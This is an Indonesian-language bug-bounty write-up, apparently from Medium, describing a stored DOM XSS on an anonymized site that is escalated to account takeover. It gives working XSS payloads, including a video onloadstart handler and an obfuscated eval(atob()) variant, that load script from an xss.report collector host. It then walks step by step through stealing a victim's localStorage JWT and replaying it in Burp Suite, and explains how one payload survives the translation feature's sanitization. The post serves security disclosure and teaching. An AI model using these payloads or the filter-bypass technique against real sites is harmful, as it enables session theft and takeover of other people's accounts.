# Stored DOM XSS to Account Takeover

> **Author**: 0xRedFox29
> **Published**: Mar 21, 2026

---

![0xRedFox29](https://miro.medium.com/v2/resize:fill:32:32/1*nJKIxQjqzieOAKoUJ4oUcA.png)

14

Share

Assalamualaikum bug hunter, di write up ini saya tulis bagaimana saya melewati filter dengan payload yang whitelist untuk memaksimalkan fitur dan menaikan dampaknya ke account takeover

![image](https://miro.medium.com/v2/resize:fit:700/1*G5URG7BwWYq1aR2zihy5aQ.png)

Berikut proof of concept versi bahasa Indonesia:

1. Untuk simulasi, buat dua akun untuk pengujian dengan masuk menggunakan browser yang berbeda [misalnya, akun A di Microsoft Edge dan akun B di Chrome (yang terhubung dengan Burp Suite)].

2. Daftar akun atau masuk ke https://xss.report/ untuk mendapatkan alamat server.

3. Buka Burp Suite, lalu pilih target di bilah navigasi dan klik Open Browser.

4. Buka situs web https://example.com

5. Masuk dengan akun yang Anda buat

6. Klik gambar logo, lalu klik create post

7. Masukkan nama apa saja untuk postingan tersebut (misalnya test xss)

8. Di kolom isi konten, masukkan payload <video autoplay onloadstart=(import(/https:\xss.report\c\yourserver/.source)) src=x></video>
<embed src=”data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+” type=”image/svg+xml” AllowScriptAccess=”always”></embed> silakan klik tombol terjemahkan

![image](https://miro.medium.com/v2/resize:fit:700/1*L0TCXg8tIVIh6YL4A7UB_A.png)

6. Pilih “public”, lalu buat kategori, dan klik “publish”

## Get 0xRedFox29’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

7. Selanjutnya, bagikan tautan ke Akun A (pastikan Anda sudah login).

8. Akun A mengklik “view translation”, yang mengirimkan data ke xss.report.

![image](https://miro.medium.com/v2/resize:fit:592/1*nlSvbfEYEsTGEq9m348OFw.jpeg)

9. Buka halaman xss.report, periksa localstorage, dan ambil isi auth._token_local dari Akun A dengan menyalinnya.

![image](https://miro.medium.com/v2/resize:fit:700/1*FNFIP8ZSeJRH4ONi2HruSQ.png)

10. Di sitemap pada Burp Suite, pilih endpoint api.example.com, lalu pilih folder users, kemudian pilih dan klik “me” dengan permintaan GET

11. Klik kanan dan pilih “Kirim ke Repeater”

12. Di bagian “Authorization Bearer”, terdapat JWT milik Akun B. Pilih semua, hapus, dan ganti dengan menempelkan JWT milik Akun A yang telah disalin sebelumnya.

13. Klik tombol “Kirim”. Voila! Data detail milik Akun A akan ditampilkan.

![image](https://miro.medium.com/v2/resize:fit:700/1*0Y7bdot2Y_e0at1Rl69-rw.png)

Penggunaan 2 baris payload saya lakukan untuk memaksimalkan bekerjanya fitur yang ada, namun satu payloadnya saja sebetulnya sudah cukup untuk memicu pop up dan mengirim data ke XSS report.

Sebelumnya saya menggunakan payload “><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2FsZHlrdW54cyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;> yang telah disediakan oleh xss.report namun malah menjadi plaintext tanpa mengirim setelah fitur lihat terjemahan di klik mungkin itu karena bergantung pada event onerror dalam elemen <source>, yang pada praktiknya tidak konsisten atau bahkan tidak dipicu oleh sebagian besar browser. Di samping itu, payload tersebut memerlukan proses decoding melalui eval(atob(...)), sehingga eksekusi bergantung pada dua tahap yang rentan gagal apabila event tidak terpicu. Ketika fitur “lihat terjemahan” diaktifkan, sistem cenderung melakukan parsing ulang dan sanitasi terhadap struktur HTML, termasuk mengubah atau menetralkan atribut berbahaya seperti event handler dan nilai yang terenkode. Akibatnya, payload kedua tidak lagi dikenali sebagai kode aktif, melainkan ditampilkan sebagai teks biasa (plaintext) tanpa mengeksekusi perintah apa pun.

Lalu setelah satu jam saya melakukan penyesuaian terhadap penggunaan tag html serta event handler yang digunakan, payload <video autoplay onloadstart=(import(/https:\xss.report\c\yourserver/.source)) src=x></video> ini mampu mengirim data ke XSS Report karena Payload langsung inline JavaScript yang tidak perlu decoding tambahan sehingga berhasil karena menggunakan elemen <video> dengan event onloadstart yang secara alami akan terpicu saat media mulai dimuat, sehingga kode JavaScript dapat dieksekusi secara langsung tanpa memerlukan proses tambahan. Selain itu, payload tersebut tetap dianggap sebagai atribut valid ketika DOM dirender ulang oleh fitur terjemahan, sehingga event kembali aktif dan mengirimkan request ke endpoint eksternal.

Sekian write up yang bisa saya bagikan, semoga bermanfaat

Terimakasih



---
*Original URL: [https://medium.com/@0xRedFox29/stored-dom-xss-to-account-takeover-268ef3869da0?source=search_post---------43-----------------------------------](https://medium.com/@0xRedFox29/stored-dom-xss-to-account-takeover-268ef3869da0?source=search_post---------43-----------------------------------)*
